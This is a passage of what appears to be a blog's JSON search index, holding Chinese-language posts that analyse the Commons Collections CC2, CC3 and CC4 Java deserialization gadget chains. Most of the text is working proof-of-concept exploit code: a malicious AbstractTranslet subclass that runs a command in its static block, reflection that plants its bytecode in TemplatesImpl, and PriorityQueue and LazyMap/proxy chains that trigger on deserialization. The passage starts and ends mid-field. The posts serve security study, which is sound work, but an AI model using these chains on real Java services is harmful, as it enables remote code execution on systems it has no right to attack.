分析，cc3可以说是cc1与cc2的结合，使用新的执行类InstantiateTransformer.Transformer与类加载代码执行相结合，入口类使用cc1的入口类。cc4则是cc2与cc3的结合，InstantiateTransformer.Transformer执行类与类加载代码执行相结合，入口类使用cc2的入口类。","text":"本文继续CommonsCollections3 和 CommonsCollections4 Gadget chain 分析，cc3可以说是cc1与cc2的结合，使用新的执行类InstantiateTransformer.Transformer与类加载代码执行相结合，入口类使用cc1的入口类。cc4则是cc2与cc3的结合，InstantiateTransformer.Transformer执行类与类加载代码执行相结合，入口类使用cc2的入口类。 CommonsCollections3漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 1234567891011121314Gadget chain： ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.Transformer() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。 TrAXFilter.TrAXFilter()类加载代码执行我们在cc2的时候分析过了，这里直接来到TrAXFilter.TrAXFilter() 1234567891011public class TrAXFilter extends XMLFilterImpl &#123; public TrAXFilter(Templates templates) throws TransformerConfigurationException&#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism(); &#125;&#125; TrAXFilter类的构造方法中templates可控，将TemplatesImpl对象传递到TrAXFilter构造方法中，当调用newTransformer方法时机会触发恶意代码。 1234567891011121314151617public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = new byte[][]&#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); new TrAXFilter(templates); &#125; InstantiateTransformer.Transformer()InstantiateTransformer的Transformer方法刚好是获取class对象的构造方法newInstance创建实例化对象。我们将TrAXFilter类的class对象传递给InstantiateTransformer的Transformer方法，获取构造方法创建实例化对象，执行恶意代码。 12345678910111213141516171819202122232425262728293031public class InstantiateTransformer implements Transformer, Serializable &#123; public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123; super(); iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; try &#123; if (input instanceof Class == false) &#123; throw new FunctorException( &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); &#125; Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;); &#125; catch (InstantiationException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex); &#125; &#125;&#125; 12345678910111213141516171819public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = new byte[][]&#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;TemplatesImpl.class&#125;, new Object[]&#123;templates&#125;); instantiateTransformer.transform(TrAXFilter.class); &#125; 入口类到InstantiateTransformer.Transformer()的链与cc1相同。 poc： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = new byte[][]&#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;TemplatesImpl.class&#125;,new Object[]&#123;templates&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); //获取AnnotationInvocationHandler Class对象 Class b = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //获取构造方法 Constructor AnnotationInvocationHandlerConstructor = b.getDeclaredConstructor(Class.class,Map.class); //设置访问权限 AnnotationInvocationHandlerConstructor.setAccessible(true); //InvocationHandler 对象 InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r); //创建代理对象 Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); //将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo InvocationHandler ooo = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,proxyMap);// Serialize(ooo); unSerialize(&quot;ooo.txt&quot;); &#125; CommonsCollections4漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：4.0 gradle：implementation group: ‘org.apache.commons’, name: ‘commons-collections4’, version: ‘4.0’ Gadget chain： 123456789101112131415Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.Transformer() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。 cc4的入口类到TransformingComparator.compare()与cc2是一样的，执行类与cc3一样，利用InstantiateTransformer类与TrAXFilter类，这里不做赘述。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859public class cc4 &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;priorityQueue.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; //获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates, &quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates, _bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(); priorityQueue.offer(1); priorityQueue.offer(2); Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass(); Field transformer = aClass.getDeclaredField(&quot;transformer&quot;); transformer.setAccessible(true); transformer.set(transformingComparator,chainedTransformer); //Serialize(priorityQueue); unSerialize(&quot;priorityQueue.txt&quot;); &#125;&#125;","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(二)","slug":"20211229","date":"2021-12-29T11:15:39.000Z","updated":"2022-01-02T03:39:34.584Z","comments":false,"path":"2021/12/29/20211229/","link":"","permalink":"https://self209.github.io/2021/12/29/20211229/","excerpt":"本文继续CommonsCollections2 Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。","text":"本文继续CommonsCollections2 Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。 漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：4.0 gradle：implementation group: ‘org.apache.commons’, name: ‘commons-collections4’, version: ‘4.0’ Gadget chain： 123456789101112Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。 类加载java类加载 类的加载连接和初始化 当 Java程序中需要使用到某个类时，虚拟机会保证这个类已经被加载、连接和初始化。而连接又包含验证、准备和解析这三个子过程，这个过程必须严格按照顺序执行。 类的加载 通过类的完全限定名（包名和类名）查找此类的字节码文件，把类的.class文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区内，然后利用字节码文件创建一个Class对象，用来封装类在方法区内的数据结构并存放在堆区内。这个过程是由类加载器完成的，我们后面会进行详细讲解。 连接 验证：确保被加载类的正确性。class 文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身的安全。 准备：为类的静态变量分配内存，并将其设置为默认值。此阶段仅仅只为静态类变量（即 static 修饰的字段变量）分配内存，并且设置该变量的初始值。（比如 static int num = 5，这里只将 num 初始化为0，5的值将会在初始化时赋值）。对于 final static 修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。 解析：把类中的符号引用转换为直接引用。符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针。相对偏移量或一个间接定位到目标的句柄。（可参考”虚拟机指令”相关内容） 初始化 类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。 利用类加载代码执行类加载器（除了根类加载器）都必须继承java.lang.ClassLoader。ClassLoader下有一个defineClass方法，它是将 byte 字节解析成虚拟机能够识别的Class对象。 TransletClassLoader 12345678910111213141516171819202122232425262728293031323334353637public final class TemplatesImpl implements Templates, Serializable &#123; static final class TransletClassLoader extends ClassLoader &#123; private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions; TransletClassLoader(ClassLoader parent) &#123; super(parent); _loadedExternalExtensionFunctions = null; &#125; TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123; super(parent); _loadedExternalExtensionFunctions = mapEF; &#125; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; Class&lt;?&gt; ret = null; // The _loadedExternalExtensionFunctions will be empty when the // SecurityManager is not set and the FSP is turned off if (_loadedExternalExtensionFunctions != null) &#123; ret = _loadedExternalExtensionFunctions.get(name); &#125; if (ret == null) &#123; ret = super.loadClass(name); &#125; return ret; &#125; /** * Access to final protected superclass member from outer class. */ Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length); &#125; &#125; &#125; TemplatesImpl.defineClass()在TemplatesImpl类中自定义了类加载器，并且定义了defineClass方法接收byte字节数组，返回ClassLoader.defineClass方法解析成的class对象，如果byte字节数组b我们可以控制那我们就可以返回任意类的class对象。 123Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length);&#125; TemplatesImpl.defineTransletClasses()在TemplatesImpl.defineTransletClasses()方法中调用了defineClass方法，其中_tfactory不能等于null，才能顺利到loader.defineClass(_bytecodes[i]); _tfactory被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值，他并不会影像我们的Gadget chain执行到loader.defineClass，loader.defineClass它传递一个_ bytecodes二维数组将class对象返回给_class数组，_bytecodes二维数组是私有属性，我们可以通过反射赋值，那么我们就找哪里调用了defineTransletClasses方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private transient TransformerFactoryImpl _tfactory = null;private byte[][] _bytecodes = null;private Class[] _class = null;private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new HashMap&lt;&gt;(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125;private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException &#123; SecurityManager security = System.getSecurityManager(); if (security != null)&#123; String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET); if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(&quot;true&quot;))) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR); throw new UnsupportedOperationException(err.toString()); &#125; &#125; // We have to read serialized fields first. ObjectInputStream.GetField gf = is.readFields(); _name = (String)gf.get(&quot;_name&quot;, null); _bytecodes = (byte[][])gf.get(&quot;_bytecodes&quot;, null); _class = (Class[])gf.get(&quot;_class&quot;, null); _transletIndex = gf.get(&quot;_transletIndex&quot;, -1); _outputProperties = (Properties)gf.get(&quot;_outputProperties&quot;, null); _indentNumber = gf.get(&quot;_indentNumber&quot;, 0); if (is.readBoolean()) &#123; _uriResolver = (URIResolver) is.readObject(); &#125; _tfactory = new TransformerFactoryImpl(); &#125; TemplatesImpl.getTransletInstance()getTransletInstance方法调用了defineTransletClasses方法，_name不等于null， _class等于null就会调用defineTransletClasses方法，newInstance创建一个实例化对象，创建实例化对象，这个过程会执行静态变量赋值和静态代码块代码，如果我们传递的byte字节数组静态代码块中有恶意代码那么在创建实例化对象时就会执行。 1234567891011121314151617181920212223242526272829private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (IllegalAccessException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; TemplatesImpl.newTransformer()在newTransformer方法中调用了getTransletInstance方法，并且newTransformer方法是public。 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer; &#125; 当我们通过反射将_ bytecodes二维数组赋值为含有恶意代码的类的byte字节，调用newTransformer方法就会触发恶意代码。 CodeImplement： 1234567891011import java.io.IOException;public class CodeImplement &#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 类加载代码执行： 1234567891011121314151617181920212223//获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates,&quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates,_bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); templates.newTransformer(); 代码执行： 发生报错，调试查看发现他会判断解析的对象的父类是不是ABSTRACT_TRANSLET常量，是的话就会把i赋值给_transletIndex，_transletIndex，默认等于-1，_transletIndex小于0就会报错，所以我们需要把存在恶意代码的类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet就能解决。 12private static String ABSTRACT_TRANSLET = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;private int _transletIndex = -1; CodeImplement： 123456789101112131415161718192021222324252627import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class CodeImplement extends AbstractTranslet&#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 编译成class文件，重写执行。 TransformingComparator.compare()执行类与cc1一样InvokerTransformer.transform()，只不过调用的是TemplatesImpl类newTransformer方法，这里我们就直接看TransformingComparator类的compare方法。 123456789101112131415161718public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123; private final Transformer&lt;? super I, ? extends O&gt; transformer; public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,final Comparator&lt;O&gt; decorated) &#123; this.decorated = decorated; this.transformer = transformer; &#125; public int compare(final I obj1, final I obj2) &#123; final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125; &#125; compare方法调用了transformer.transform()，transformer可控，那么将InvokerTransformer传递给transformer就会调用InvokerTransformer.transform()。 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; //获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates,&quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates,_bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); new TransformingComparator(newTransformer).compare(templates,&quot;templates&quot;);&#125; 运行代码： PriorityQueue之后便是找什么地方调用了compare方法，来到PriorityQueue类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123; private final Comparator&lt;? super E&gt; comparator; private int size = 0; public boolean offer(E e) &#123; if (e == null) throw new NullPointerException(); modCount++; int i = size; if (i &gt;= queue.length) grow(i + 1); size = i + 1; if (i == 0) queue[0] = e; else siftUp(i, e); return true; &#125; public PriorityQueue(int initialCapacity,Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator; &#125; private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; &#125; siftDownUsingComparator方法调用了comparator.compare(x, (E) c)，comparator可控，那么我们找在哪调用了siftDownUsingComparator方法，发现siftDown方法调用了参数x可控，那么我们找在哪调用了siftDown方法，发现在heapify方法中调用了，并且把queue[i]传递给x，那我们就要看怎么把templates赋值到queue。在offer方法当i == 0就可以把templates赋值到queue，但是当i不等于0时就会调用siftUp方法，会触发我们的调用链，所以为了它在调用offer方法的时候不触发调用链，我们在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中，利用反射在templates赋值到queue之后，再把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中。 1234567891011121314151617181920212223242526272829303132333435363738//获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates, &quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates, _bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); //利用InvokerTransformer类获取newTransformer方法。 InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); //在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中 TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); //new 一个PriorityQueue对象将transformingComparator传递给comparator属性 PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.offer(templates); priorityQueue.offer(templates); //把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中 Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass(); Field transformer = aClass.getDeclaredField(&quot;transformer&quot;); transformer.setAccessible(true); transformer.set(transformingComparator,newTransformer); PriorityQueue.readObject() 在PriorityQueue.readObject方法中调用了heapify方法，所以在priorityQueue对象反序列化时就会调用heapify方法 12345678910111213private void readObject(java.io.ObjectInputStream s throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify(); &#125; poc: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import com.sun.org.apache.xalan.internal.xsltc.trax.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Transformer;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.*;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Comparator;import java.util.PriorityQueue;public class cc2 &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;priorityQueue.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; //获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates, &quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates, 